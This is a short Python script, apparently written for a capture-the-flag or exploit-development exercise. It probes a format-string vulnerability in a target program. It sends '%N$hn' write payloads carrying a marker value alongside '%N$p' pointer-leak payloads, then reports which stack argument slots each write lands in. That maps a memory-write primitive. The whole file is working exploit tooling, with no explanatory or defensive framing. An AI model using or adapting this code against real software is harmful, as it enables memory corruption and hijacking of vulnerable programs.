import re,sys
from rprobe import run
MARK=0x0f0f
def probe(w,grp):
    f1='%%1$%dc%%%d$hn'%(MARK,w)
    f2=''.join('%%%d$p.'%g for g in grp)[:-1]
    lk,out=run('1',f1,f2)
    v=re.findall(r'0x[0-9a-f]+|\(nil\)',out)
    return v
writers=[23,38,20,27,50,53]
for w in writers:
    hits=[]
    for start in range(40,96,5):
        grp=list(range(start,start+5))
        try:
            v=probe(w,grp)
            for g,x in zip(grp,v):
                if x!='(nil)' and (int(x,16)&0xffff)==MARK: hits.append((g,x))
        except Exception as e: print('err',w,grp,e)
    print('writer arg%-3d -> landed in slots: %s'%(w,hits))
